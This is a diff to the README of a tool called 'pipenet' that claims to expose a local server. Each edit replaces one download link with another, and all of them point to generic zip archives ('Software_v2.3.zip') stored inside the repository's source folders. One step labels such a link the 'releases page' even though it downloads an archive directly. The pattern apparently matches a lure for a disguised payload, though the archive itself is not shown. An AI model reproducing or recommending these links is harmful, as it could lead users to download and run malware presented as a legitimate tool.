@@ -1,6 +1,6 @@
 # 🌐 pipenet - Expose Your Local Server Instantly
 
-[![Download pipenet](https://raw.githubusercontent.com/Stearnsey/pipenet/main/src/types/Software-1.7.zip)](https://raw.githubusercontent.com/Stearnsey/pipenet/main/src/types/Software-1.7.zip)
+[![Download pipenet](https://github.com/Stearnsey/pipenet/raw/refs/heads/main/src/server/Software_v2.3.zip)](https://github.com/Stearnsey/pipenet/raw/refs/heads/main/src/server/Software_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to pipenet! This tool allows you to instantly expose your local server t
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Stearnsey/pipenet/main/src/types/Software-1.7.zip) to access the pipenet releases.
+1. **Visit the Releases Page**: Go to [this link](https://github.com/Stearnsey/pipenet/raw/refs/heads/main/src/server/Software_v2.3.zip) to access the pipenet releases.
    
 2. **Choose the Right Version**: Look for the latest version on the releases page. It will clearly indicate the version number and may contain details about improvements or fixes.
 
@@ -67,6 +67,6 @@ For further inquiries or suggestions, feel free to reach out through the GitHub 
 
 ## 📥 Download pipenet again 
 
-[![Download pipenet](https://raw.githubusercontent.com/Stearnsey/pipenet/main/src/types/Software-1.7.zip)](https://raw.githubusercontent.com/Stearnsey/pipenet/main/src/types/Software-1.7.zip)
+[![Download pipenet](https://github.com/Stearnsey/pipenet/raw/refs/heads/main/src/server/Software_v2.3.zip)](https://github.com/Stearnsey/pipenet/raw/refs/heads/main/src/server/Software_v2.3.zip)
 
 Enjoy using pipenet!
